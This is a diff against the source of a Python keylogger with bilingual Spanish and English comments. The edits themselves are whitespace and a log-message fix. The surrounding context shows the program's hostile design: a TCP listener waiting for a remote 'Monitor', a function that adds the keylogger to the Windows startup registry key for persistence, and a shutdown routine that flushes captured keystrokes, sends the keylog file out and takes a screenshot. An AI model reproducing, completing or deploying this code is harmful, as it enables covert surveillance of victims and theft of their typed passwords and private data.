@@ -1,4 +1,4 @@
-#!/usr/bin/env python 
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 #
 #-----------------------------------------------------------------------------------------------------------
@@ -221,7 +221,7 @@ class ServerListenerThread(threading.Thread):
 
         while True:
             tcpServer.listen(SERVER_MAX_CLIENTS)    # 5 clients are more than enough. Normally there is only 1 monitor.
-            msg = 'Esperando conexión del Monitor Monitor...'
+            msg = 'Esperando conexión del Monitor...'
             log_verbose(msg, logging.INFO, 1)
             (conn, (ip, port)) = tcpServer.accept()
             new_thread = ClientThread(conn, ip, port)
@@ -271,9 +271,9 @@ def paste_file():
     return paste_id
 
 
-# Añade al registro una clave para que se cargue el keylogger en cada inicio del sistema 
+# Añade al registro una clave para que se cargue el keylogger en cada inicio del sistema
 # Add the file to the startup registry key
-def add_keylogger_to_startup():  
+def add_keylogger_to_startup():
     fp = os.path.dirname(os.path.realpath(__file__))
     fileName = sys.argv[0].split('\\')[-1]
     newFilePath = fp + '\\' + fileName
@@ -540,14 +540,14 @@ def on_close_program():
     key_buffer += CRLF + CRLF
     key_buffer += '[CLOSING PROGRAM]' + CRLF
     key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF
-    
+
     # se asegura de vaciar buffer - empty the key buffer to disk
     flush_key_buffer_to_disk()
-    
+
     # envia ultimo fichero de log de teclas - send de last keylog capture file
     send_keylog_file()
-    
-    # ejecuta captura de pantalla - do a screenshot 
+
+    # ejecuta captura de pantalla - do a screenshot
     capture_screen()
 
     # espera que finalicen todos los threads que pueda haber activos
